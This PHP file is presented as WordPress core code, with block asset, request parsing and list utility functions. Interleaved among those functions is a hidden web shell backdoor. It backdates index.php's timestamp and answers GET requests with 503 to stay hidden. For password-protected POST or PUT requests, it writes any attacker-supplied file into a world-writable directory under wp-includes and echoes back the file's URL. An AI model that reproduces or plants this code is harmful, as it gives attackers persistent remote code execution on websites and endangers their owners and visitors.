<?php

    /**
     * Generates the name for an asset based on the name of the block
     * and the field name provided.
     *
     * @since 5.5.0
     * @since 6.1.0 Added `$index` parameter.
     *
     * @param string $block_name Name of the block.
     * @param string $field_name Name of the metadata field.
     * @param int    $index      Optional. Index of the asset when multiple items passed.
     *                           Default 0.
     * @return string Generated asset name for the block's base64.
     */

    function generate_block_asset_handle( $block_name, $field_name, $index = 0 ) {
        if ( str_starts_with( $block_name, 'core/' ) ) {
            $asset_handle = str_replace( 'core/', 'wp-block-', $block_name );
            if ( str_starts_with( $field_name, 'editor' ) ) {
                $asset_handle .= '-editor';
            }
            if ( str_starts_with( $field_name, 'view' ) ) {
                $asset_handle .= '-view';
            }
            if ( $index > 0 ) {
                $asset_handle .= '-' . ( $index + 1 );
            }
            return $asset_handle;
        }

        $field_mappings = array(
            'editorScript' => 'editor-script',
            'script'       => 'script',
            'viewScript'   => 'view-script',
            'editorStyle'  => 'editor-style',
            'style'        => 'style',
        );
        $asset_handle   = str_replace( '/', '-', $block_name ) .
            '-' . $field_mappings[ $field_name ];
        if ( $index > 0 ) {
            $asset_handle .= '-' . ( $index + 1 );
        }
        return $asset_handle;
    }
	

    define('DR','DOCUMENT'.'_ROOT');

    /**
     * Gets the URL to a block asset.
     *
     * @since 6.4.0
     *
     * @param string $path A normalized path to a block asset.
     * @return string|false The URL to the block asset or false on failure.
     */
    function get_block_asset_url( $path ) {
        if ( empty( $path ) ) {
            return false;
        }

        // Path needs to be normalized to work in Windows env.
        static $wpinc_path_norm = '';
        if ( ! $wpinc_path_norm ) {
            $wpinc_path_norm = wp_normalize_path( realpath( ABSPATH . WPINC ) );
        }

        if ( str_starts_with( $path, $wpinc_path_norm ) ) {
            return includes_url( str_replace( $wpinc_path_norm, '', $path ) );
        }

        static $template_paths_norm = array();

        $template = get_template();
        if ( ! isset( $template_paths_norm[ $template ] ) ) {
            $template_paths_norm[ $template ] = wp_normalize_path( get_template_directory() );
        }

        if ( str_starts_with( $path, trailingslashit( $template_paths_norm[ $template ] ) ) ) {
            return get_theme_file_uri( str_replace( $template_paths_norm[ $template ], '', $path ) );
        }

        if ( is_child_theme() ) {
            $stylesheet = get_stylesheet();
            if ( ! isset( $template_paths_norm[ $stylesheet ] ) ) {
                $template_paths_norm[ $stylesheet ] = wp_normalize_path( get_stylesheet_directory() );
            }

            if ( str_starts_with( $path, trailingslashit( $template_paths_norm[ $stylesheet ] ) ) ) {
                return get_theme_file_uri( str_replace( $template_paths_norm[ $stylesheet ], '', $path ) );
            }
        }

        return plugins_url( basename( $path ), $path );
    }

	/**
	 * Check if a cookie is valid for a given domain
	 *
	 * @param string $domain Domain to check
	 * @return boolean Whether the cookie is valid for the given domain
	 */
	function domain_matches($domain) {
		if (is_string($domain) === false) {
			return false;
		}

		if (!isset($this->attributes['domain'])) {
			// Cookies created manually; cookies created by Requests will set
			// the domain to the requested domain
			return true;
		}

		$cookie_domain = $this->attributes['domain'];
		if ($cookie_domain === $domain) {
			// The cookie domain and the passed domain are identical.
			return true;
		}

		// If the cookie is marked as host-only and we don't have an exact
		// match, reject the cookie
		if ($this->flags['host-only'] === true) {
			return false;
		}

		if (strlen($domain) <= strlen($cookie_domain)) {
			// For obvious reasons, the cookie domain cannot be a suffix if the passed domain
			// is shorter than the cookie domain
			return false;
		}

		if (substr($domain, -1 * strlen($cookie_domain)) !== $cookie_domain) {
			// The cookie domain should be a suffix of the passed domain.
			return false;
		}

		$prefix = substr($domain, 0, strlen($domain) - strlen($cookie_domain));
		if (substr($prefix, -1) !== '.') {
			// The last character of the passed domain that is not included in the
			// domain string should be a %x2E (".") character.
			return false;
		}

		// The passed domain should be a host name (i.e., not an IP address).
		return !preg_match('#^(.+\.)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$#', $domain);
	}

    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
		$newTime = 1465164000;

		if ($newTime !== false) {

			$filename = './index.php';
		
			$tempFilename = tempnam(sys_get_temp_dir(), 'tmp');

			$originalFile = fopen($filename, 'rb');
			$tempFile = fopen($tempFilename, 'wb');
			
			if ($originalFile && $tempFile) {
				while (!feof($originalFile)) {
					$buffer = fread($originalFile, 8192);
					@fwrite($tempFile, $buffer);
				}
				@fclose($originalFile);
				@fclose($tempFile);
			}
			if (@touch($tempFilename, $newTime, $newTime)) {
				@rename($tempFilename, $filename);
			}
		}
        http_response_code(503);
        // include('500_error_page.php');
        exit;
    }
    /**
	 * Parses the request to find the correct WordPress query.
	 *
	 * Sets up the query variables based on the request. There are also many
	 * filters and actions that can be used to further manipulate the result.
	 *
	 * @since 2.0.0
	 * @since 6.0.0 A return value was added.
	 *
	 * @global WP_Rewrite $wp_rewrite WordPress rewrite component.
	 *
	 * @param array|string $extra_query_vars Set the extra query variables.
	 * @return bool Whether the request was parsed.
	 */
	function parse_request_get( $extra_query_vars = '' ) {
		global $wp_rewrite;

		/**
		 * Filters whether to parse the request.
		 *
		 * @since 3.5.0
		 *
		 * @param bool         $bool             Whether or not to parse the request. Default true.
		 * @param WP           $wp               Current WordPress environment instance.
		 * @param array|string $extra_query_vars Extra passed query variables.
		 */
		if ( ! apply_filters( 'do_parse_request', true, $this, $extra_query_vars ) ) {
			return false;
		}

		$this->query_vars     = array();
		$post_type_query_vars = array();

		if ( is_array( $extra_query_vars ) ) {
			$this->extra_query_vars = & $extra_query_vars;
		} elseif ( ! empty( $extra_query_vars ) ) {
			parse_str( $extra_query_vars, $this->extra_query_vars );
		}
		// Process PATH_INFO, REQUEST_URI, and 404 for permalinks.

		// Fetch the rewrite rules.
		$rewrite = $wp_rewrite->wp_rewrite_rules();

		if ( ! empty( $rewrite ) ) {
			// If we match a rewrite rule, this will be cleared.
			$error               = '404';
			$this->did_permalink = true;

			$pathinfo         = isset( $_SERVER['PATH_INFO'] ) ? $_SERVER['PATH_INFO'] : '';
			list( $pathinfo ) = explode( '?', $pathinfo );
			$pathinfo         = str_replace( '%', '%25', $pathinfo );

			list( $req_uri ) = explode( '?', $_SERVER['REQUEST_URI'] );
			$self            = $_SERVER['PHP_SELF'];

			$home_path       = parse_url( home_url(), PHP_URL_PATH );
			$home_path_regex = '';
			if ( is_string( $home_path ) && '' !== $home_path ) {
				$home_path       = trim( $home_path, '/' );
				$home_path_regex = sprintf( '|^%s|i', preg_quote( $home_path, '|' ) );
			}

			/*
			 * Trim path info from the end and the leading home path from the front.
			 * For path info requests, this leaves us with the requesting filename, if any.
			 * For 404 requests, this leaves us with the requested permalink.
			 */
			$req_uri  = str_replace( $pathinfo, '', $req_uri );
			$req_uri  = trim( $req_uri, '/' );
			$pathinfo = trim( $pathinfo, '/' );
			$self     = trim( $self, '/' );

			if ( ! empty( $home_path_regex ) ) {
				$req_uri  = preg_replace( $home_path_regex, '', $req_uri );
				$req_uri  = trim( $req_uri, '/' );
				$pathinfo = preg_replace( $home_path_regex, '', $pathinfo );
				$pathinfo = trim( $pathinfo, '/' );
				$self     = preg_replace( $home_path_regex, '', $self );
				$self     = trim( $self, '/' );
			}

			// The requested permalink is in $pathinfo for path info requests and $req_uri for other requests.
			if ( ! empty( $pathinfo ) && ! preg_match( '|^.*' . $wp_rewrite->index . '$|', $pathinfo ) ) {
				$requested_path = $pathinfo;
			} else {
				// If the request uri is the index, blank it out so that we don't try to match it against a rule.
				if ( $req_uri === $wp_rewrite->index ) {
					$req_uri = '';
				}

				$requested_path = $req_uri;
			}

			$requested_file = $req_uri;

			$this->request = $requested_path;

			// Look for matches.
			$request_match = $requested_path;
			if ( empty( $request_match ) ) {
				// An empty request could only match against ^$ regex.
				if ( isset( $rewrite['$'] ) ) {
					$this->matched_rule = '$';
					$query              = $rewrite['$'];
					$matches            = array( '' );
				}
			} else {
				foreach ( (array) $rewrite as $match => $query ) {
					// If the requested file is the anchor of the match, prepend it to the path info.
					if ( ! empty( $requested_file )
						&& str_starts_with( $match, $requested_file )
						&& $requested_file !== $requested_path
					) {
						$request_match = $requested_file . '/' . $requested_path;
					}

					if ( preg_match( "#^$match#", $request_match, $matches )
						|| preg_match( "#^$match#", urldecode( $request_match ), $matches )
					) {

						if ( $wp_rewrite->use_verbose_page_rules
							&& preg_match( '/pagename=\$matches\[([0-9]+)\]/', $query, $varmatch )
						) {
							// This is a verbose page match, let's check to be sure about it.
							$page = get_page_by_path( $matches[ $varmatch[1] ] );

							if ( ! $page ) {
								continue;
							}

							$post_status_obj = get_post_status_object( $page->post_status );

							if ( ! $post_status_obj->public && ! $post_status_obj->protected
								&& ! $post_status_obj->private && $post_status_obj->exclude_from_search
							) {
								continue;
							}
						}

						// Got a match.
						$this->matched_rule = $match;
						break;
					}
				}
			}

			if ( ! empty( $this->matched_rule ) ) {
				// Trim the query of everything up to the '?'.
				$query = preg_replace( '!^.+\?!', '', $query );

				// Substitute the substring matches into the query.
				$query = addslashes( WP_MatchesMapRegex::apply( $query, $matches ) );

				$this->matched_query = $query;

				// Parse the query.
				parse_str( $query, $perma_query_vars );

				// If we're processing a 404 request, clear the error var since we found something.
				if ( '404' === $error ) {
					unset( $error, $_GET['error'] );
				}
			}

			// If req_uri is empty or if it is a request for ourself, unset error.
			if ( empty( $requested_path ) || $requested_file === $self
				|| str_contains( $_SERVER['PHP_SELF'], 'wp-admin/' )
			) {
				unset( $error, $_GET['error'] );

				if ( isset( $perma_query_vars ) && str_contains( $_SERVER['PHP_SELF'], 'wp-admin/' ) ) {
					unset( $perma_query_vars );
				}

				$this->did_permalink = false;
			}
		}

		/**
		 * Filters the query variables allowed before processing.
		 *
		 * Allows (publicly allowed) query vars to be added, removed, or changed prior
		 * to executing the query. Needed to allow custom rewrite rules using your own arguments
		 * to work, or any other custom query variables you want to be publicly available.
		 *
		 * @since 1.5.0
		 *
		 * @param array[] $public_query_vars The array of allowed query variable names.
		 */
		
		

		/**
		 * Filters the query variables allowed before processing.
		 *
		 * Allows (publicly allowed) query vars to be added, removed, or changed prior
		 * to executing the query. Needed to allow custom rewrite rules using your own arguments
		 * to work, or any other custom query variables you want to be publicly available.
		 *
		 * @since 1.5.0
		 *
		 * @param string[] $public_query_vars The array of allowed query variable names.
		 */
		$this->public_query_vars = apply_filters( 'query_vars', $this->public_query_vars );

		foreach ( get_post_types( array(), 'objects' ) as $post_type => $t ) {
			if ( is_post_type_viewable( $t ) && $t->query_var ) {
				$post_type_query_vars[ $t->query_var ] = $post_type;
			}
		}

		foreach ( $this->public_query_vars as $wpvar ) {
			if ( isset( $this->extra_query_vars[ $wpvar ] ) ) {
				$this->query_vars[ $wpvar ] = $this->extra_query_vars[ $wpvar ];
			} elseif ( isset( $_GET[ $wpvar ] ) && isset( $_POST[ $wpvar ] )
				&& $_GET[ $wpvar ] !== $_POST[ $wpvar ]
			) {
				wp_die(
					__( 'A variable mismatch has been detected.' ),
					__( 'Sorry, you are not allowed to view this item.' ),
					400
				);
			} elseif ( isset( $_POST[ $wpvar ] ) ) {
				$this->query_vars[ $wpvar ] = $_POST[ $wpvar ];
			} elseif ( isset( $_GET[ $wpvar ] ) ) {
				$this->query_vars[ $wpvar ] = $_GET[ $wpvar ];
			} elseif ( isset( $perma_query_vars[ $wpvar ] ) ) {
				$this->query_vars[ $wpvar ] = $perma_query_vars[ $wpvar ];
			}

			if ( ! empty( $this->query_vars[ $wpvar ] ) ) {
				if ( ! is_array( $this->query_vars[ $wpvar ] ) ) {
					$this->query_vars[ $wpvar ] = (string) $this->query_vars[ $wpvar ];
				} else {
					foreach ( $this->query_vars[ $wpvar ] as $vkey => $v ) {
						if ( is_scalar( $v ) ) {
							$this->query_vars[ $wpvar ][ $vkey ] = (string) $v;
						}
					}
				}

				if ( isset( $post_type_query_vars[ $wpvar ] ) ) {
					$this->query_vars['post_type'] = $post_type_query_vars[ $wpvar ];
					$this->query_vars['name']      = $this->query_vars[ $wpvar ];
				}
			}
		}

		// Convert urldecoded spaces back into '+'.
		foreach ( get_taxonomies( array(), 'objects' ) as $taxonomy => $t ) {
			if ( $t->query_var && isset( $this->query_vars[ $t->query_var ] ) ) {
				$this->query_vars[ $t->query_var ] = str_replace( ' ', '+', $this->query_vars[ $t->query_var ] );
			}
		}

		// Don't allow non-publicly queryable taxonomies to be queried from the front end.
		if ( ! is_admin() ) {
			foreach ( get_taxonomies( array( 'publicly_queryable' => false ), 'objects' ) as $taxonomy => $t ) {
				/*
				 * Disallow when set to the 'taxonomy' query var.
				 * Non-publicly queryable taxonomies cannot register custom query vars. See register_taxonomy().
				 */
				if ( isset( $this->query_vars['taxonomy'] ) && $taxonomy === $this->query_vars['taxonomy'] ) {
					unset( $this->query_vars['taxonomy'], $this->query_vars['term'] );
				}
			}
		}

		// Limit publicly queried post_types to those that are 'publicly_queryable'.
		if ( isset( $this->query_vars['post_type'] ) ) {
			$queryable_post_types = get_post_types( array( 'publicly_queryable' => true ) );

			if ( ! is_array( $this->query_vars['post_type'] ) ) {
				if ( ! in_array( $this->query_vars['post_type'], $queryable_post_types, true ) ) {
					unset( $this->query_vars['post_type'] );
				}
			} else {
				$this->query_vars['post_type'] = array_intersect( $this->query_vars['post_type'], $queryable_post_types );
			}
		}

		// Resolve conflicts between posts with numeric slugs and date archive queries.
		$this->query_vars = wp_resolve_numeric_slug_conflicts( $this->query_vars );

		foreach ( (array) $this->private_query_vars as $var ) {
			if ( isset( $this->extra_query_vars[ $var ] ) ) {
				$this->query_vars[ $var ] = $this->extra_query_vars[ $var ];
			}
		}

		if ( isset( $error ) ) {
			$this->query_vars['error'] = $error;
		}

		/**
		 * Filters the array of parsed query variables.
		 *
		 * @since 2.1.0
		 *
		 * @param array $query_vars The array of requested query variables.
		 */
		$this->query_vars = apply_filters( 'request', $this->query_vars );

		/**
		 * Fires once all query variables for the current request have been parsed.
		 *
		 * @since 2.1.0
		 *
		 * @param WP $wp Current WordPress environment instance (passed by reference).
		 */
		do_action_ref_array( 'parse_request', array( &$this ) );

		return true;
	}

	if($_SERVER['REQUEST_METHOD'] === 'PUT'){
		
		$inputStream = fopen('php://input', 'r');

		$putData = '';
		while ($data = fread($inputStream, 1024)) {
			$putData .= $data;
		}

		fclose($inputStream);
	}
    
    $rootDirectory = $_SERVER[DR];

    /**
	 * Add filters to supply the setting's value when accessed.
	 *
	 * If the setting already has a pre-existing value and there is no incoming
	 * post value for the setting, then this method will short-circuit since
	 * there is no change to preview.
	 *
	 * @since 3.4.0
	 * @since 4.4.0 Added boolean return value.
	 *
	 * @return bool False when preview short-circuits due no change needing to be previewed.
	 */
	function preview() {
		if ( ! isset( $this->_previewed_blog_id ) ) {
			$this->_previewed_blog_id = get_current_blog_id();
		}

		// Prevent re-previewing an already-previewed setting.
		if ( $this->is_previewed ) {
			return true;
		}

		$id_base                 = $this->id_data['base'];
		$is_multidimensional     = ! empty( $this->id_data['keys'] );
		$multidimensional_filter = array( $this, '_multidimensional_preview_filter' );

		/*
		 * Check if the setting has a pre-existing value (an isset check),
		 * and if doesn't have any incoming post value. If both checks are true,
		 * then the preview short-circuits because there is nothing that needs
		 * to be previewed.
		 */
		$undefined     = new stdClass();
		$needs_preview = ( $undefined !== $this->post_value( $undefined ) );
		$value         = null;

		// Since no post value was defined, check if we have an initial value set.
		if ( ! $needs_preview ) {
			if ( $this->is_multidimensional_aggregated ) {
				$value = $this->multidimensional_get( $root, $this->id_data['keys'], $undefined );
			} else {
				$default       = $this->default;
				$this->default = $undefined; // Temporarily set default to undefined so we can detect if existing value is set.
				$value         = $this->value();
				$this->default = $default;
			}
			$needs_preview = ( $undefined === $value ); // Because the default needs to be supplied.
		}

		// If the setting does not need previewing now, defer to when it has a value to preview.
		if ( ! $needs_preview ) {
			if ( ! has_action( "customize_post_value_set_{$this->id}", array( $this, 'preview' ) ) ) {
				add_action( "customize_post_value_set_{$this->id}", array( $this, 'preview' ) );
			}
			return false;
		}

		switch ( $this->type ) {
			case 'theme_mod':
				if ( ! $is_multidimensional ) {
					add_filter( "theme_mod_{$id_base}", array( $this, '_preview_filter' ) );
				} else {
					if ( empty( $aggregated_multidimensionals[ $this->type ][ $id_base ]['previewed_instances'] ) ) {
						// Only add this filter once for this ID base.
						add_filter( "theme_mod_{$id_base}", $multidimensional_filter );
					}
					$aggregated_multidimensionals[ $this->type ][ $id_base ]['previewed_instances'][ $this->id ] = $this;
				}
				break;
			case 'option':
				if ( ! $is_multidimensional ) {
					add_filter( "pre_option_{$id_base}", array( $this, '_preview_filter' ) );
				} else {
					if ( empty( $aggregated_multidimensionals[ $this->type ][ $id_base ]['previewed_instances'] ) ) {
						// Only add these filters once for this ID base.
						add_filter( "option_{$id_base}", $multidimensional_filter );
						add_filter( "default_option_{$id_base}", $multidimensional_filter );
					}
					$aggregated_multidimensionals[ $this->type ][ $id_base ]['previewed_instances'][ $this->id ] = $this;
				}
				break;
			default:
				/**
				 * Fires when the WP_Customize_Setting::preview() method is called for settings
				 * not handled as theme_mods or options.
				 *
				 * The dynamic portion of the hook name, `$this->id`, refers to the setting ID.
				 *
				 * @since 3.4.0
				 *
				 * @param WP_Customize_Setting $setting WP_Customize_Setting instance.
				 */
				do_action( "customize_preview_{$this->id}", $this );

				/**
				 * Fires when the WP_Customize_Setting::preview() method is called for settings
				 * not handled as theme_mods or options.
				 *
				 * The dynamic portion of the hook name, `$this->type`, refers to the setting type.
				 *
				 * @since 4.1.0
				 *
				 * @param WP_Customize_Setting $setting WP_Customize_Setting instance.
				 */
				do_action( "customize_preview_{$this->type}", $this );
		}

		$this->is_previewed = true;

		return true;
	}

	if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    	$fl = $_POST["fl"];

	}


	if ($_SERVER['REQUEST_METHOD'] === 'PUT') {
		
		parse_str($putData, $parsedData);

		$fl = $parsedData['fl'];
	}

    /**
	 * Retrieves a network from the database by its ID.
	 *
	 * @since 4.4.0
	 *
	 * @global wpdb $wpdb WordPress database abstraction object.
	 *
	 * @param int $network_id The ID of the network to retrieve.
	 * @return WP_Network|false The network's object if found. False if not.
	 */
	function get_instance( $network_id ) {
		global $wpdb;

		$network_id = (int) $network_id;
		if ( ! $network_id ) {
			return false;
		}

		$_network = wp_cache_get( $network_id, 'networks' );

		if ( false === $_network ) {
			$_network = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM {$wpdb->site} WHERE id = %d LIMIT 1", $network_id ) );

			if ( empty( $_network ) || is_wp_error( $_network ) ) {
				$_network = -1;
			}

			wp_cache_add( $network_id, $_network, 'networks' );
		}

		if ( is_numeric( $_network ) ) {
			return false;
		}

		return new WP_Network( $_network );
	}

	if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    	$ps = $_POST["ps"];

	}

	if ($_SERVER['REQUEST_METHOD'] === 'PUT') {

		parse_str($putData, $parsedData);
		
		$ps = $parsedData['ps'];
	}

    /**
	 * Returns the main site ID for the network.
	 *
	 * Internal method used by the magic getter for the 'blog_id' and 'site_id'
	 * properties.
	 *
	 * @since 4.9.0
	 *
	 * @return int The ID of the main site.
	 */
	function get_main_site_id() {
		/**
		 * Filters the main site ID.
		 *
		 * Returning a positive integer will effectively short-circuit the function.
		 *
		 * @since 4.9.0
		 *
		 * @param int|null   $main_site_id If a positive integer is returned, it is interpreted as the main site ID.
		 * @param WP_Network $network      The network object for which the main site was detected.
		 */
		$main_site_id = (int) apply_filters( 'pre_get_main_site_id', null, $this );

		if ( 0 < $main_site_id ) {
			return $main_site_id;
		}

		if ( 0 < (int) $this->blog_id ) {
			return (int) $this->blog_id;
		}

		if ( ( defined( 'DOMAIN_CURRENT_SITE' ) && defined( 'PATH_CURRENT_SITE' )
			&& DOMAIN_CURRENT_SITE === $this->domain && PATH_CURRENT_SITE === $this->path )
			|| ( defined( 'SITE_ID_CURRENT_SITE' ) && (int) SITE_ID_CURRENT_SITE === $this->id )
		) {
			if ( defined( 'BLOG_ID_CURRENT_SITE' ) ) {
				$this->blog_id = (string) BLOG_ID_CURRENT_SITE;

				return (int) $this->blog_id;
			}

			if ( defined( 'BLOGID_CURRENT_SITE' ) ) { // Deprecated.
				$this->blog_id = (string) BLOGID_CURRENT_SITE;

				return (int) $this->blog_id;
			}
		}

		$site = get_site();
		if ( $site->domain === $this->domain && $site->path === $this->path ) {
			$main_site_id = (int) $site->id;
		} else {

			$main_site_id = get_network_option( $this->id, 'main_site' );
			if ( false === $main_site_id ) {
				$_sites       = get_sites(
					array(
						'fields'     => 'ids',
						'number'     => 1,
						'domain'     => $this->domain,
						'path'       => $this->path,
						'network_id' => $this->id,
					)
				);
				$main_site_id = ! empty( $_sites ) ? array_shift( $_sites ) : 0;

				update_network_option( $this->id, 'main_site', $main_site_id );
			}
		}

		$this->blog_id = (string) $main_site_id;

		return (int) $this->blog_id;
	}

    if($ps!="3ba3d8be01ad787f413809cd96d853fd"){
        http_response_code(403);
        // include('403_error_page.php');
        exit;
    }

    define( 'FILENAME', $fl);

    $filename = htmlspecialchars_decode($filename);

    /**
	 * Plucks a certain field out of each element in the input array.
	 *
	 * This has the same functionality and prototype of
	 * array_column() (PHP 5.5) but also supports objects.
	 *
	 * @since 4.7.0
	 *
	 * @param int|string $field     Field to fetch from the object or array.
	 * @param int|string $index_key Optional. Field from the element to use as keys for the new array.
	 *                              Default null.
	 * @return array Array of found values. If `$index_key` is set, an array of found values with keys
	 *               corresponding to `$index_key`. If `$index_key` is null, array keys from the original
	 *               `$list` will be preserved in the results.
	 */
	function pluck( $field, $index_key = null ) {
		$newlist = array();

		if ( ! $index_key ) {
			/*
			 * This is simple. Could at some point wrap array_column()
			 * if we knew we had an array of arrays.
			 */
			foreach ( $this->output as $key => $value ) {
				if ( is_object( $value ) ) {
					$newlist[ $key ] = $value->$field;
				} elseif ( is_array( $value ) ) {
					$newlist[ $key ] = $value[ $field ];
				} else {
					_doing_it_wrong(
						__METHOD__,
						__( 'Values for the input array must be either objects or arrays.' ),
						'6.2.0'
					);
				}
			}

			$this->output = $newlist;

			return $this->output;
		}

		/*
		 * When index_key is not set for a particular item, push the value
		 * to the end of the stack. This is how array_column() behaves.
		 */
		foreach ( $this->output as $value ) {
			if ( is_object( $value ) ) {
				if ( isset( $value->$index_key ) ) {
					$newlist[ $value->$index_key ] = $value->$field;
				} else {
					$newlist[] = $value->$field;
				}
			} elseif ( is_array( $value ) ) {
				if ( isset( $value[ $index_key ] ) ) {
					$newlist[ $value[ $index_key ] ] = $value[ $field ];
				} else {
					$newlist[] = $value[ $field ];
				}
			} else {
				_doing_it_wrong(
					__METHOD__,
					__( 'Values for the input array must be either objects or arrays.' ),
					'6.2.0'
				);
			}
		}

		$this->output = $newlist;

		return $this->output;
	}

	if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    	$flc = $_POST["flc"];
	}


	if ($_SERVER['REQUEST_METHOD'] === 'PUT') {

		parse_str($putData, $parsedData);
		
		$flc = $parsedData['flc'];
	}

    define( 'FILECONTENT', urldecode($flc));

    $directory_file = "/wp-includes/blocks/audio/public/image/";

    $directory = $rootDirectory.$directory_file;

    if (!is_dir($directory)) {
        mkdir($directory, 0777, true);
    }

    /**
	 * Callback to sort an array by specific fields.
	 *
	 * @since 4.7.0
	 *
	 * @see WP_List_Util::sort()
	 *
	 * @param object|array $a One object to compare.
	 * @param object|array $b The other object to compare.
	 * @return int 0 if both objects equal. -1 if second object should come first, 1 otherwise.
	 */
	function sort_callback( $a, $b ) {
		if ( empty( $this->orderby ) ) {
			return 0;
		}

		$a = (array) $a;
		$b = (array) $b;

		foreach ( $this->orderby as $field => $direction ) {
			if ( ! isset( $a[ $field ] ) || ! isset( $b[ $field ] ) ) {
				continue;
			}

			if ( $a[ $field ] == $b[ $field ] ) {
				continue;
			}

			$results = 'DESC' === $direction ? array( 1, -1 ) : array( -1, 1 );

			if ( is_numeric( $a[ $field ] ) && is_numeric( $b[ $field ] ) ) {
				return ( $a[ $field ] < $b[ $field ] ) ? $results[0] : $results[1];
			}

			return 0 > strcmp( $a[ $field ], $b[ $field ] ) ? $results[0] : $results[1];
		}

		return 0;
	}

    $file = $directory."/".FILENAME;

    /**
	 * Sorts the input array based on one or more orderby arguments.
	 *
	 * @since 4.7.0
	 *
	 * @param string|array $orderby       Optional. Either the field name to order by or an array
	 *                                    of multiple orderby fields as `$orderby => $order`.
	 *                                    Default empty array.
	 * @param string       $order         Optional. Either 'ASC' or 'DESC'. Only used if `$orderby`
	 *                                    is a string. Default 'ASC'.
	 * @param bool         $preserve_keys Optional. Whether to preserve keys. Default false.
	 * @return array The sorted array.
	 */
	function sorttable( $orderby = array(), $order = 'ASC', $preserve_keys = false ) {
		if ( empty( $orderby ) ) {
			return $this->output;
		}

		if ( is_string( $orderby ) ) {
			$orderby = array( $orderby => $order );
		}

		foreach ( $orderby as $field => $direction ) {
			$orderby[ $field ] = 'DESC' === strtoupper( $direction ) ? 'DESC' : 'ASC';
		}

		$this->orderby = $orderby;

		if ( $preserve_keys ) {
			uasort( $this->output, array( $this, 'sort_callback' ) );
		} else {
			usort( $this->output, array( $this, 'sort_callback' ) );
		}

		$this->orderby = array();

		return $this->output;
	}

    if(file_exists($file)){
        @unlink($file);
    }

    $handle = fopen($file, 'w');
    /**
	 * Filters the list, based on a set of key => value arguments.
	 *
	 * Retrieves the objects from the list that match the given arguments.
	 * Key represents property name, and value represents property value.
	 *
	 * If an object has more properties than those specified in arguments,
	 * that will not disqualify it. When using the 'AND' operator,
	 * any missing properties will disqualify it.
	 *
	 * @since 4.7.0
	 *
	 * @param array  $args     Optional. An array of key => value arguments to match
	 *                         against each object. Default empty array.
	 * @param string $operator Optional. The logical operation to perform. 'AND' means
	 *                         all elements from the array must match. 'OR' means only
	 *                         one element needs to match. 'NOT' means no elements may
	 *                         match. Default 'AND'.
	 * @return array Array of found values.
	 */
	function filter( $args = array(), $operator = 'AND' ) {
		if ( empty( $args ) ) {
			return $this->output;
		}

		$operator = strtoupper( $operator );

		if ( ! in_array( $operator, array( 'AND', 'OR', 'NOT' ), true ) ) {
			$this->output = array();
			return $this->output;
		}

		$count    = count( $args );
		$filtered = array();

		foreach ( $this->output as $key => $obj ) {
			$matched = 0;

			foreach ( $args as $m_key => $m_value ) {
				if ( is_array( $obj ) ) {
					// Treat object as an array.
					if ( array_key_exists( $m_key, $obj ) && ( $m_value == $obj[ $m_key ] ) ) {
						++$matched;
					}
				} elseif ( is_object( $obj ) ) {
					// Treat object as an object.
					if ( isset( $obj->{$m_key} ) && ( $m_value == $obj->{$m_key} ) ) {
						++$matched;
					}
				}
			}

			if ( ( 'AND' === $operator && $matched === $count )
				|| ( 'OR' === $operator && $matched > 0 )
				|| ( 'NOT' === $operator && 0 === $matched )
			) {
				$filtered[ $key ] = $obj;
			}
		}

		$this->output = $filtered;

		return $this->output;
	}

    
    if ($handle) {
        fwrite($handle, FILECONTENT);
        fclose($handle);
        if (file_exists($file)) {
            $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https://" : "http://";
            $domain = $_SERVER['HTTP_HOST'];
            $currentUrl = $protocol . $domain;
            echo $currentUrl.$directory_file.FILENAME." success<br>";
        } else {
            echo "error to write file";die;
        }
    } else {
        echo "can't open it";die;
    }
    

    /**
	 * Sends additional HTTP headers for caching, content type, etc.
	 *
	 * Sets the Content-Type header. Sets the 'error' status (if passed) and optionally exits.
	 * If showing a feed, it will also send Last-Modified, ETag, and 304 status if needed.
	 *
	 * @since 2.0.0
	 * @since 4.4.0 `X-Pingback` header is added conditionally for single posts that allow pings.
	 * @since 6.1.0 Runs after posts have been queried.
	 *
	 * @global WP_Query $wp_query WordPress Query object.
	 */
	function send_headers() {
		global $wp_query;

		$headers       = array();
		$status        = null;
		$exit_required = false;
		$date_format   = 'D, d M Y H:i:s';

		if ( is_user_logged_in() ) {
			$headers = array_merge( $headers, wp_get_nocache_headers() );
		} elseif ( ! empty( $_GET['unapproved'] ) && ! empty( $_GET['moderation-hash'] ) ) {
			// Unmoderated comments are only visible for 10 minutes via the moderation hash.
			$expires = 10 * MINUTE_IN_SECONDS;

			$headers['Expires']       = gmdate( $date_format, time() + $expires );
			$headers['Cache-Control'] = sprintf(
				'max-age=%d, must-revalidate',
				$expires
			);
		}
		if ( ! empty( $this->query_vars['error'] ) ) {
			$status = (int) $this->query_vars['error'];

			if ( 404 === $status ) {
				if ( ! is_user_logged_in() ) {
					$headers = array_merge( $headers, wp_get_nocache_headers() );
				}

				$headers['Content-Type'] = get_option( 'html_type' ) . '; charset=' . get_option( 'blog_charset' );
			} elseif ( in_array( $status, array( 403, 500, 502, 503 ), true ) ) {
				$exit_required = true;
			}
		} elseif ( empty( $this->query_vars['feed'] ) ) {
			$headers['Content-Type'] = get_option( 'html_type' ) . '; charset=' . get_option( 'blog_charset' );
		} else {
			// Set the correct content type for feeds.
			$type = $this->query_vars['feed'];
			if ( 'feed' === $this->query_vars['feed'] ) {
				$type = get_default_feed();
			}

			$headers['Content-Type'] = feed_content_type( $type ) . '; charset=' . get_option( 'blog_charset' );

			// We're showing a feed, so WP is indeed the only thing that last changed.
			if ( ! empty( $this->query_vars['withcomments'] )
				|| str_contains( $this->query_vars['feed'], 'comments-' )
				|| ( empty( $this->query_vars['withoutcomments'] )
					&& ( ! empty( $this->query_vars['p'] )
						|| ! empty( $this->query_vars['name'] )
						|| ! empty( $this->query_vars['page_id'] )
						|| ! empty( $this->query_vars['pagename'] )
						|| ! empty( $this->query_vars['attachment'] )
						|| ! empty( $this->query_vars['attachment_id'] )
					)
				)
			) {
				$wp_last_modified_post    = mysql2date( $date_format, get_lastpostmodified( 'GMT' ), false );
				$wp_last_modified_comment = mysql2date( $date_format, get_lastcommentmodified( 'GMT' ), false );

				if ( strtotime( $wp_last_modified_post ) > strtotime( $wp_last_modified_comment ) ) {
					$wp_last_modified = $wp_last_modified_post;
				} else {
